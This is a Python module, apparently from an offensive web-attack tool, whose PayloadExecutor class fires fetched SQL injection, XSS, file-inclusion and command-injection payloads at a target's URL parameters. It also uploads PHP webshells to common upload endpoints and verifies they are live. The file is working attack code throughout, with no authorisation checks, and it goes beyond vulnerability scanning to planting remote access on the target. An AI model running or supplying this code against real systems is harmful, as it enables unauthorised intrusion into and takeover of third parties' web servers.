#!/usr/bin/env python3

import os
import sys
import time
import json
import requests
import re
import urllib.parse
from typing import Dict, List, Optional

# Add the project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from lib.core.settings import logger, set_color

class PayloadExecutor:
    """
    Executes all fetched online payloads against target systems
    Takes payloads from DynamicPayloadFetcher and implements them on targets
    """
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.session = requests.Session()
        self.successful_payloads = []
        self.failed_payloads = []
        
        # Configure session
        self.session.headers.update({
            'User-Agent': self.config.get('user_agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        
        if self.config.get('proxy'):
            self.session.proxies = {'http': self.config['proxy'], 'https': self.config['proxy']}
        
        self.timeout = self.config.get('timeout', 15)
        self.delay = self.config.get('delay', 0.5)
    
    def execute_all_payloads(self, target_url: str, fetched_payloads: Dict) -> Dict:
        """Execute all fetched payloads against target URL"""
        logger.info(set_color("Starting comprehensive payload execution against target", level=35))
        
        execution_summary = {
            'target': target_url,
            'start_time': time.time(),
            'payloads_executed': 0,
            'successful_exploits': 0,
            'vulnerabilities_found': [],
            'detailed_results': {}
        }
        
        # Execute SQL Injection payloads
        if 'sql_payloads' in fetched_payloads and fetched_payloads['sql_payloads']:
            logger.info(set_color("Testing SQL Injection payloads from online sources", level=35))
            sql_results = self._execute_sql_payloads(target_url, fetched_payloads['sql_payloads'])
            execution_summary['detailed_results']['sql_injection'] = sql_results
            execution_summary['payloads_executed'] += len(fetched_payloads['sql_payloads'])
            
            if sql_results['successful_payloads']:
                execution_summary['successful_exploits'] += len(sql_results['successful_payloads'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'SQL Injection',
                    'severity': 'Critical',
                    'payloads': sql_results['successful_payloads'][:5]
                })
        
        # Execute XSS payloads
        if 'xss_payloads' in fetched_payloads and fetched_payloads['xss_payloads']:
            logger.info(set_color("Testing XSS payloads from online sources", level=35))
            xss_results = self._execute_xss_payloads(target_url, fetched_payloads['xss_payloads'])
            execution_summary['detailed_results']['xss'] = xss_results
            execution_summary['payloads_executed'] += len(fetched_payloads['xss_payloads'])
            
            if xss_results['successful_payloads']:
                execution_summary['successful_exploits'] += len(xss_results['successful_payloads'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'High',
                    'payloads': xss_results['successful_payloads'][:5]
                })
        
        # Execute LFI/RFI payloads
        if 'lfi_payloads' in fetched_payloads and fetched_payloads['lfi_payloads']:
            logger.info(set_color("Testing LFI/RFI payloads from online sources", level=35))
            lfi_results = self._execute_lfi_rfi_payloads(target_url, fetched_payloads['lfi_payloads'])
            execution_summary['detailed_results']['lfi_rfi'] = lfi_results
            execution_summary['payloads_executed'] += len(fetched_payloads['lfi_payloads'])
            
            if lfi_results['successful_payloads']:
                execution_summary['successful_exploits'] += len(lfi_results['successful_payloads'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Local/Remote File Inclusion',
                    'severity': 'Critical',
                    'payloads': lfi_results['successful_payloads'][:5]
                })
        
        # Execute Command Injection payloads
        if 'cmd_payloads' in fetched_payloads and fetched_payloads['cmd_payloads']:
            logger.info(set_color("Testing Command Injection payloads from online sources", level=35))
            cmd_results = self._execute_cmd_injection_payloads(target_url, fetched_payloads['cmd_payloads'])
            execution_summary['detailed_results']['command_injection'] = cmd_results
            execution_summary['payloads_executed'] += len(fetched_payloads['cmd_payloads'])
            
            if cmd_results['successful_payloads']:
                execution_summary['successful_exploits'] += len(cmd_results['successful_payloads'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Command Injection',
                    'severity': 'Critical',
                    'payloads': cmd_results['successful_payloads'][:5]
                })
        
        # Deploy Webshells from online sources
        if 'webshells' in fetched_payloads and fetched_payloads['webshells']:
            logger.info(set_color("Deploying webshells from online repositories", level=35))
            webshell_results = self._deploy_webshells(target_url, fetched_payloads['webshells'])
            execution_summary['detailed_results']['webshell_deployment'] = webshell_results
            execution_summary['payloads_executed'] += len(fetched_payloads['webshells'])
            
            if webshell_results['successful_deployments']:
                execution_summary['successful_exploits'] += len(webshell_results['successful_deployments'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Webshell Deployment',
                    'severity': 'Critical',
                    'payloads': webshell_results['successful_deployments'][:3]
                })
        
        execution_summary['end_time'] = time.time()
        execution_summary['duration'] = execution_summary['end_time'] - execution_summary['start_time']
        
        logger.info(set_color(f"Payload execution completed - {execution_summary['successful_exploits']} successful exploits found", level=35))
        
        return execution_summary
    
    def _execute_sql_payloads(self, target_url: str, sql_payloads: List[str]) -> Dict:
        """Execute SQL injection payloads"""
        results = {
            'total_payloads': len(sql_payloads),
            'successful_payloads': []
        }
        
        # Find potential SQL injection parameters
        test_parameters = self._find_injection_parameters(target_url)
        
        for param_data in test_parameters[:3]:  # Test first 3 parameters
            url = param_data['url']
            param = param_data['parameter']
            
            logger.debug(set_color(f"Testing SQL payloads on parameter: {param}", level=35))
            
            # Test ALL SQL payloads - this is what implements the online payloads
            if self.config.get('fast_mode'):
                total_payloads = min(len(sql_payloads), 20)  # Fast mode: 20 payloads
            elif self.config.get('comprehensive_mode'):
                total_payloads = len(sql_payloads)  # Comprehensive: ALL payloads
            else:
                total_payloads = min(len(sql_payloads), 100)  # Default: 100 payloads
            logger.info(set_color(f"Testing {total_payloads} SQL injection payloads on parameter {param}", level=35))
            
            for i, payload in enumerate(sql_payloads[:total_payloads]):
                try:
                    clean_payload = payload.strip()
                    if not clean_payload or clean_payload.startswith('#'):
                        continue
                    
                    # Show progress every 25 payloads
                    if i % 25 == 0 and i > 0:
                        logger.info(set_color(f"Progress: {i}/{total_payloads} SQL payloads tested on {param}", level=25))
                    
                    test_url = self._inject_into_parameter(url, param, clean_payload)
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._check_sql_injection(response, clean_payload):
                        results['successful_payloads'].append({
                            'payload': clean_payload,
                            'parameter': param,
                            'url': test_url
                        })
                        logger.info(set_color(f"SQL injection found with payload: {clean_payload[:50]}...", level=35))
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue
        
        return results
    
    def _execute_xss_payloads(self, target_url: str, xss_payloads: List[str]) -> Dict:
        """Execute XSS payloads"""
        results = {
            'total_payloads': len(xss_payloads),
            'successful_payloads': []
        }
        
        test_parameters = self._find_injection_parameters(target_url)
        
        for param_data in test_parameters[:3]:
            url = param_data['url']
            param = param_data['parameter']
            
            # Test ALL XSS payloads - this implements the comprehensive online payload collection
            if self.config.get('fast_mode'):
                total_payloads = min(len(xss_payloads), 15)  # Fast mode: 15 payloads
            elif self.config.get('comprehensive_mode'):
                total_payloads = len(xss_payloads)  # Comprehensive: ALL payloads
            else:
                total_payloads = min(len(xss_payloads), 100)  # Default: 100 payloads
            logger.info(set_color(f"Testing {total_payloads} XSS payloads on parameter {param}", level=35))
            
            for i, payload in enumerate(xss_payloads[:total_payloads]):
                try:
                    clean_payload = payload.strip()
                    if not clean_payload:
                        continue
                    
                    # Show progress every 50 payloads for XSS
                    if i % 50 == 0 and i > 0:
                        logger.info(set_color(f"Progress: {i}/{total_payloads} XSS payloads tested on {param}", level=25))
                    
                    test_url = self._inject_into_parameter(url, param, clean_payload)
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._check_xss_reflection(response, clean_payload):
                        results['successful_payloads'].append({
                            'payload': clean_payload,
                            'parameter': param,
                            'url': test_url
                        })
                        logger.info(set_color(f"XSS found with payload: {clean_payload[:50]}...", level=35))
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue
        
        return results
    
    def _execute_lfi_rfi_payloads(self, target_url: str, lfi_payloads: List[str]) -> Dict:
        """Execute LFI/RFI payloads"""
        results = {
            'total_payloads': len(lfi_payloads),
            'successful_payloads': []
        }
        
        file_parameters = self._find_file_inclusion_parameters(target_url)
        
        for param_data in file_parameters[:2]:
            url = param_data['url']
            param = param_data['parameter']
            
            # Test ALL LFI payloads - implement the complete online collection  
            total_payloads = min(len(lfi_payloads), 50) if not self.config.get('comprehensive_mode') else len(lfi_payloads)
            logger.info(set_color(f"Testing {total_payloads} LFI/RFI payloads on parameter {param}", level=35))
            
            for i, payload in enumerate(lfi_payloads[:total_payloads]):
                try:
                    clean_payload = payload.strip()
                    if not clean_payload:
                        continue
                    
                    test_url = self._inject_into_parameter(url, param, clean_payload)
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._check_file_inclusion(response, clean_payload):
                        results['successful_payloads'].append({
                            'payload': clean_payload,
                            'parameter': param,
                            'url': test_url
                        })
                        logger.info(set_color(f"LFI found with payload: {clean_payload}", level=35))
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue
        
        return results
    
    def _execute_cmd_injection_payloads(self, target_url: str, cmd_payloads: List[str]) -> Dict:
        """Execute command injection payloads"""
        results = {
            'total_payloads': len(cmd_payloads),
            'successful_payloads': []
        }
        
        test_parameters = self._find_injection_parameters(target_url)
        
        for param_data in test_parameters[:2]:
            url = param_data['url']
            param = param_data['parameter']
            
            # Test ALL command injection payloads - full implementation of online collection
            total_payloads = min(len(cmd_payloads), 50) if not self.config.get('comprehensive_mode') else len(cmd_payloads)
            logger.info(set_color(f"Testing {total_payloads} command injection payloads on parameter {param}", level=35))
            
            for i, payload in enumerate(cmd_payloads[:total_payloads]):
                try:
                    clean_payload = payload.strip()
                    if not clean_payload:
                        continue
                    
                    test_url = self._inject_into_parameter(url, param, clean_payload)
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._check_command_injection(response, clean_payload):
                        results['successful_payloads'].append({
                            'payload': clean_payload,
                            'parameter': param,
                            'url': test_url
                        })
                        logger.info(set_color(f"Command injection found with payload: {clean_payload}", level=35))
                    
                    time.sleep(self.delay * 2)
                    
                except Exception as e:
                    continue
        
        return results
    
    def _deploy_webshells(self, target_url: str, webshells: List[Dict]) -> Dict:
        """Deploy webshells to target system"""
        results = {
            'total_webshells': len(webshells),
            'successful_deployments': [],
            'deployment_urls': []
        }
        
        logger.info(set_color(f"Attempting to deploy {len(webshells)} webshells from online repositories", level=35))
        
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Common webshell upload endpoints
        upload_paths = [
            '/upload.php', '/fileupload.php', '/admin/upload.php', '/wp-admin/admin-ajax.php',
            '/uploader.php', '/file_upload.php', '/upload/', '/files/upload.php'
        ]
        
        for webshell in webshells[:5]:  # Deploy first 5 webshells
            try:
                if isinstance(webshell, dict) and 'content' in webshell:
                    shell_name = webshell.get('name', f'shell_{int(time.time())}.php')
                    shell_content = webshell['content']
                    
                    logger.info(set_color(f"Deploying webshell: {shell_name}", level=35))
                    
                    # Try different upload methods
                    for upload_path in upload_paths[:3]:
                        upload_url = base_url + upload_path
                        
                        try:
                            # Method 1: POST file upload
                            files = {'file': (shell_name, shell_content, 'application/x-php')}
                            response = self.session.post(upload_url, files=files, timeout=self.timeout)
                            
                            if response.status_code == 200 and 'success' in response.text.lower():
                                shell_url = base_url + '/' + shell_name
                                
                                # Verify webshell is accessible
                                verify_response = self.session.get(shell_url, timeout=self.timeout)
                                if verify_response.status_code == 200:
                                    results['successful_deployments'].append({
                                        'name': shell_name,
                                        'url': shell_url,
                                        'upload_method': 'POST file upload',
                                        'upload_endpoint': upload_url
                                    })
                                    results['deployment_urls'].append(shell_url)
                                    logger.info(set_color(f"Webshell deployed successfully: {shell_url}", level=35))
                                    break
                            
                            time.sleep(self.delay)
                            
                        except Exception as e:
                            continue
                
            except Exception as e:
                continue
        
        return results
    
    # Helper methods
    def _find_injection_parameters(self, target_url: str) -> List[Dict]:
        """Find potential injection parameters"""
        from urllib.parse import urlparse, parse_qs
        
        parameters = []
        parsed = urlparse(target_url)
        
        # Parse existing parameters
        if parsed.query:
            params = parse_qs(parsed.query)
            for param_name in params.keys():
                parameters.append({
                    'url': target_url,
                    'parameter': param_name,
                    'method': 'GET'
                })
        
        # Add common parameters
        common_params = ['id', 'user', 'page', 'search', 'q', 'file', 'cmd']
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param in common_params:
            parameters.append({
                'url': f"{base_url}?{param}=test",
                'parameter': param,
                'method': 'GET'
            })
        
        return parameters
    
    def _find_file_inclusion_parameters(self, target_url: str) -> List[Dict]:
        """Find file inclusion parameters"""
        file_params = ['file', 'page', 'include', 'path', 'doc']
        from urllib.parse import urlparse
        
        parameters = []
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param in file_params:
            parameters.append({
                'url': f"{base_url}?{param}=test",
                'parameter': param,
                'method': 'GET'
            })
        
        return parameters
    
    def _inject_into_parameter(self, url: str, parameter: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        try:
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            encoded_payload = urllib.parse.quote(payload)
            params[parameter] = [encoded_payload]
            
            new_query = urlencode(params, doseq=True)
            new_parsed = parsed._replace(query=new_query)
            
            return urlunparse(new_parsed)
            
        except Exception as e:
            # Fallback
            separator = '&' if '?' in url else '?'
            return f"{url}{separator}{parameter}={urllib.parse.quote(payload)}"
    
    def _check_sql_injection(self, response: requests.Response, payload: str) -> bool:
        """Check if SQL injection was successful"""
        sql_indicators = [
            'mysql_fetch_array', 'mysql_num_rows', 'warning: mysql_',
            'ora-01756', 'oracle error', 'microsoft ole db provider',
            'sqlserver jdbc driver', 'postgresql query failed',
            'sqlite_query', 'syntax error', 'unexpected token'
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in sql_indicators)
    
    def _check_xss_reflection(self, response: requests.Response, payload: str) -> bool:
        """Check if XSS payload was reflected"""
        if payload in response.text:
            return True
        
        import html
        encoded_payload = html.escape(payload)
        if encoded_payload in response.text:
            return True
        
        return 'script' in payload.lower() and 'script' in response.text.lower()
    
    def _check_file_inclusion(self, response: requests.Response, payload: str) -> bool:
        """Check if file inclusion was successful"""
        file_indicators = [
            'root:x:', 'daemon:x:', '/bin/bash', '/bin/sh',
            '[boot loader]', 'linux version', 'processor',
            '<?php', 'function ', 'class '
        ]
        
        return any(indicator in response.text for indicator in file_indicators)
    
    def _check_command_injection(self, response: requests.Response, payload: str) -> bool:
        """Check if command injection was successful"""
        command_indicators = [
            'uid=', 'gid=', 'groups=', 'total ', 'drwx', '-rwx',
            'linux', 'darwin', 'windows nt', 'root', 'www-data', 'apache'
        ]
        
        return any(indicator in response.text.lower() for indicator in command_indicators)